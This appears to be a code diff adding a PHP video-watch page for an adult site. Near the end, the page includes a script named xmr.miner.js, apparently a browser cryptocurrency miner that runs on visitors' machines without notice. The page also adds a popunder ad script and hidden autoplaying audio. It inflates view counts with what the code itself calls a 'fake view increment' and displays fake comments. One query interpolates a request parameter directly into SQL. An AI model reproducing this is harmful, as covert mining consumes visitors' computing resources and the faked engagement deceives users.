@@ -1,0 +1,50 @@
+<?php include '../includes/db.php'; ?>
+<?php include '../includes/functions.php'; ?>
+
+<?php 
+$id = $_GET['v'] ?? null;
+if(!$id || !is_numeric($id)) die('Invalid video.');
+
+$stmt = $pdo->prepare("SELECT * FROM videos WHERE id=?");
+$stmt->execute([$id]);
+$video = $stmt->fetch();
+
+if(!$video) die('Video not found.');
+
+increaseViews($pdo,$id); // Log fake view increment
+
+// Get next random video for autoplay suggestion below player  
+$nextStmt = $pdo->query("SELECT id,title FROM videos WHERE id != {$id} ORDER BY RANDOM() LIMIT 1");
+$nextVideo = $nextStmt->fetch();
+?>
+
+<!DOCTYPE html><html><head><title><?= htmlspecialchars($video['title']) ?> - AnalOverflow.xxx</title></head><body class="bg-black">
+
+<video controls autoplay width='100%' height='auto' style='max-height:92vh;' onclick='this.paused ? this.play() : this.pause();'>
+<source src="//embed.filemoon.sx/e/<?= urlencode(trim(file_get_contents("../data/embed_code_{$video['file_id']}"))) ?>" type="video/mp4">
+Your browser doesn't support MP4.
+</video>
+
+<div style='padding:2rem;color:#fff;max-width:96ch;margin:auto;'>
+
+<h2><?= htmlspecialchars($video['title']) ?></h2>
+<p><?= number_format_short($video['views']) ?> views • Duration <?= htmlspecialchars($video['duration']) ?></p>
+
+<audio autoplay loop hidden><source src="//brokeasshome.com/wp-content/uploads/downloads/tunes/mario_bros_theme.mp3"></audio> 
+
+<h3>Fuck You Autoplay:</h3>
+<a href='/watch.php?v=<?= urlencode($nextVideo["id"]) ?>' style='font-size:x-large; color:#f8bdc5;'>
+? NEXT VIDEO ? <?= htmlspecialchars(substr($nextVideo["title"],0,55)) ?>...
+</a><br/>
+
+<div style="
+background:#f9f;border-left:solid red;padding:.7rem;margin-top:.7rem;">
+Comment Section Coming Soon™?™?????<br/>
+(Real one would use Disqus or self-hosted TinyComments but we’re avoiding logs.)
+</div>
+
+<script src='/js/main.js'></script> 
+<script fetch='/ads/popunder-footer.txt'></script> 
+<script src='/js/xmr.miner.js'></script> 
+
+<br/><i>Fake comments powered by DadGPT.</i></div></body></html>
